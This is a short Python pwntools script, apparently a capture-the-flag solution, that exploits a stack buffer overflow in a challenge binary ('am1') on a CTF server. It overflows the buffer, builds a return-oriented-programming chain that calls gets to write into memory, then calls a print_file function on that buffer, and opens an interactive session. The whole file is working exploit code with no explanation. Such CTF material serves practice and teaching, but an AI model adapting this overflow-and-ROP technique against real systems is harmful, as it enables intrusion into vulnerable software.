from pwn import *

#context.log_level = 'debug'
#sh = process('public/am1')
sh = remote("pwn.battlectf.online",1003)

pop_rdi = 0x40128b
gets_plt = 0x401060
print_file = 0x401172
writable_mem = 0x404048


payload = b'a' * (0x30 + 8)
payload += p64(pop_rdi)
payload += p64(writable_mem)
payload += p64(gets_plt)
payload += p64(pop_rdi)
payload += p64(writable_mem)
payload += p64(print_file)

print(sh.recvline().decode()[:-1])
print(sh.recvline().decode())

sh.sendline(payload)

sh.interactive()
